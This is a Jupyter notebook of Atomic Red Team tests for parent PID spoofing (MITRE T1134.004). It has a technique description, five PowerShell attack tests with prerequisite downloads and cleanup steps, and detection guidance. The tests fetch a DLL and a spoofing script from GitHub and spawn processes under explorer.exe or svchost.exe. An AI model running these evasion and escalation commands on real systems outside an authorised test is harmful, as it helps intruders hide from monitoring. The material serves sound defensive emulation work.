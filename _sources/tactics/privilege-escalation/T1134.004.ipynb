{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d71b0d8c",
   "metadata": {},
   "source": "# T1134.004 - Parent PID Spoofing\nAdversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)"
  },
  {
   "cell_type": "markdown",
   "id": "e3b72d00",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "359aa943",
   "metadata": {},
   "source": "### Atomic Test #1 - Parent PID Spoofing using PowerShell\nThis test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: DLL to inject must exist on disk at specified location (#{dll_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path PathToAtomicsFolder\\T1134.004\\bin\\calc.dll) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1134.004\\bin\\calc.dll) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll\" -OutFile \"PathToAtomicsFolder\\T1134.004\\bin\\calc.dll\"\n\n```\n##### Description: PPID.ps1 must exist on disk at $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134.004/src/PPID-Spoof.ps1\" -OutFile $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aa84c0bf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.004 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7781ecb2",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n. $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\n$ppid=Get-Process explorer | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -dllpath \"PathToAtomicsFolder\\T1134.004\\bin\\calc.dll\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "615e6361",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "65af5732",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name \"calculator\" -ErrorAction Ignore\nStop-Process -Name \"iexplore\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fbabbba2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.004 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3702a9d8",
   "metadata": {},
   "source": "### Atomic Test #2 - Parent PID Spoofing - Spawn from Current Process\nSpawns a powershell.exe process as a child of the current process.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9c2b2d52",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.004 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2bb65c8a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5b3b9344",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "ed4a53bf",
   "metadata": {},
   "source": "### Atomic Test #3 - Parent PID Spoofing - Spawn from Specified Process\nSpawns a notepad.exe process as a child of the current process.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d2ae3f2c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.004 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "eaba202b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-ATHProcessUnderSpecificParent  -ParentId $PID -TestGuid 12345678-1234-1234-1234-123456789123```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2ebe4398",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.004 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "739d6a21",
   "metadata": {},
   "source": "### Atomic Test #4 - Parent PID Spoofing - Spawn from svchost.exe\nSpawnd a process as a child of the first accessible svchost.exe process.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ce99a19d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.004 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "587a9377",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter \"Name = 'svchost.exe' AND CommandLine LIKE '%'\" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10'```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5c20c795",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.004 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "341dbaeb",
   "metadata": {},
   "source": "### Atomic Test #5 - Parent PID Spoofing - Spawn from New Process\nCreates a notepad.exe process and then spawns a powershell.exe process as a child of it.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "39df935a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.004 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "00bef690",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-Process -FilePath $Env:windir\\System32\\notepad.exe -PassThru | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10'```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "772dcdd9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.004 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "f24b7f47",
   "metadata": {},
   "source": "## Detection\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)\n\nMonitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}